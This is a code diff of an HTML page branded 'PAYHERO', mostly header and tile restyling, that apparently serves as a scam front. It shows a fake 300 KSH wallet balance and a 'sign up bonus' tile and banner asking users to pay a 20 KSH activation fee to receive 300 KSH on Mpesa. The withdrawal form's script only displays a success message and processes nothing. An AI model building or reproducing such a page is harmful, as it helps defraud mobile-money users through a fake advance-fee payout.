@@ -5,77 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PAYHERO</title>
     <link rel="stylesheet" href="styles.css">
-    <style>
-      .withdrawal-page {
-        background-color: white;
-        padding: 20px;
-        border-radius: 5px;
-        max-width: 500px;
-        margin: 50px auto;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        display: none;
-      }
-
-      .banner {
-        background-color: green;
-        color: white;
-        padding: 10px;
-        text-align: center;
-        border-radius: 5px;
-        margin-bottom: 20px;
-      }
-
-      .withdraw-button {
-        background-color: green;
-        color: white;
-        border: none;
-        padding: 10px 20px;
-        font-size: 16px;
-        border-radius: 5px;
-        cursor: pointer;
-        font-weight: bold;
-      }
-
-      .withdraw-button:hover {
-        background-color: darkgreen;
-      }
-
-      .withdrawal-success {
-        background-color: lightgreen;
-        color: green;
-        padding: 10px;
-        text-align: center;
-        border-radius: 5px;
-        display: none;
-        margin-bottom: 20px;
-      }
-
-      .back-button {
-        background-color: #f0f0f0;
-        border: 1px solid #ccc;
-        padding: 10px 20px;
-        font-size: 16px;
-        border-radius: 5px;
-        cursor: pointer;
-        display: none;
-        margin-top: 20px;
-      }
-
-      .back-button:hover {
-        background-color: #e0e0e0;
-      }
-    </style>
   </head>
   <body>
     <div class="app">
+      <!-- Original content unchanged -->
       <header class="app-header">
-        <h1>PAYHERO</h1>
-        <nav>
-          <a href="#">Overview</a>
-          <a href="#" class="active">Payments</a>
-          <a href="#">Cards</a>
-          <a href="#">Account</a>
-        </nav>
+        <div class="app-header-logo">
+          <div class="logo">
+            <span class="logo-icon">
+              <img src="https://assets.codepen.io/285131/almeria-logo.svg" />
+            </span>
+            <h1 class="logo-title">
+              <span>woo</span>
+              <span>PAYHERO</span>
+            </h1>
+          </div>
+        </div>
+        <div class="app-header-navigation">
+          <div class="tabs">
+            <a href="#">Overview</a>
+            <a href="#" class="active">Payments</a>
+            <a href="#">Cards</a>
+            <a href="#">Account</a>
+            <a href="#">System</a>
+            <a href="#">Business</a>
+          </div>
+        </div>
+        <div class="app-header-actions">
+          <button class="user-profile">
+            <span>Mutsotso Duncan</span>
+            <span><img src="" /></span>
+          </button>
+        </div>
       </header>
       <div class="app-body">
         <div class="service-section">
@@ -84,22 +45,35 @@
             <!-- My Wallet Tile -->
             <article class="tile" id="wallet-tile">
               <div class="tile-header">
-                <h3>My Wallet</h3>
-                <p><strong>Balance: 300 KSH</strong></p>
+                <i class="ph-lightning-light"></i>
+                <h3><span>My Wallet</span><span><strong>Balance: 300 KSH</strong></span></h3>
               </div>
               <a href="#" id="wallet-link">
                 <span>Go to service</span>
+                <span class="icon-button"><i class="ph-caret-right-bold"></i></span>
               </a>
             </article>
 
             <!-- Other tiles remain unchanged -->
             <article class="tile">
-              <h3>Top up airtime</h3>
-              <a href="https://airtime.africomltd.com/">Go to service</a>
+              <div class="tile-header">
+                <i class="ph-fire-simple-light"></i>
+                <h3><span>Top up airtime</span><span>safaricom plc</span></h3>
+              </div>
+              <a href="https://airtime.africomltd.com/">
+                <span>Go to service</span>
+                <span class="icon-button"><i class="ph-caret-right-bold"></i></span>
+              </a>
             </article>
             <article class="tile">
-              <h3>Sign up bonus</h3>
-              <a href="https://app.payhero.co.ke/lipwa/835">Continue to pay</a>
+              <div class="tile-header">
+                <i class="ph-file-light"></i>
+                <h3><span>Sign up bonus</span><span>Free KSH 300. By paying 20 KSH you activate your account bonus of 300/= sent direct to your Mpesa.</span></h3>
+              </div>
+              <a href="https://app.payhero.co.ke/lipwa/835">
+                <span>Continue to pay</span>
+                <span class="icon-button"><i class="ph-caret-right-bold"></i></span>
+              </a>
             </article>
           </div>
         </div>
@@ -107,7 +81,7 @@
     </div>
 
     <!-- Withdrawal Page (Initially hidden) -->
-    <div class="withdrawal-page" id="wallet-page">
+    <div class="withdrawal-page" id="wallet-page" style="display: none;">
       <div class="banner">
         Make sure you have made your customer launch fee of 20 KSH.
       </div>
@@ -121,10 +95,10 @@
         <input type="number" id="withdraw-amount" min="300" required /><br>
         <button type="submit" class="withdraw-button">Submit</button>
       </form>
-      <div class="withdrawal-success" id="withdrawal-success">
+      <div class="withdrawal-success" id="withdrawal-success" style="display: none;">
         Withdrawal request success! Wait as we validate your payment message for 3 mins.
       </div>
-      <button class="back-button" id="back-button">Back to Homepage</button>
+      <button class="back-button" id="back-button" style="display: none;">Back to Homepage</button>
     </div>
 
     <script>
@@ -146,7 +120,7 @@
       withdrawForm.addEventListener('submit', function (event) {
         event.preventDefault();
         successMessage.style.display = 'block';
-        backButton.style.display = 'inline-block';
+        backButton.style.display = 'block';
         setTimeout(function () {
           successMessage.style.display = 'none';
         }, 12000); // Hide success message after 12 seconds
@@ -160,4 +134,4 @@
       });
     </script>
   </body>
-                              </html>
+</html>
